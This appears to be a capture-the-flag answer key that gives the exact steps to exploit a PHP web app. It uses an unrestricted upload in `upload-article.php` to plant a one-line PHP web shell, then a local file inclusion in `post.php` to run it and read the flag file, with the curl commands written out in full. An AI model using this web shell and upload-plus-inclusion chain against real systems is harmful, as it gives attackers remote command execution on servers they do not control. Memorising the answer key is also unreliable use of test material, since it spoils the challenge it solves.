# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Unrestricted file upload chained with Local File Inclusion → PHP
RCE. `upload-article.php` stores an uploaded file with no validation under
`posts/uploads/`, and `post.php?id=...` includes an arbitrary file, so including
your uploaded PHP shell executes it.

1. **Upload a minimal PHP web shell** via the article upload form:

   ```
   printf '%s' '<?php system($_GET["c"]); ?>' > myshell.php
   curl -s -X POST "http://<target>/posts/upload-article.php" \
     -F "name=a" -F "email=a@a.com" -F "articleFile=@myshell.php"
   ```

2. **Trigger the LFI** in `post.php` to include and run the shell, passing the
   command via `c` (note: `id=uploads/myshell`, the `.php` is appended):

   ```
   curl -s "http://<target>/post.php?id=uploads/myshell&c=cat+/FLAG.txt"
   ```

3. **Extract the flag** (`FLAG{...}`) from the top of the response (printed before
   the page template) and report it verbatim.
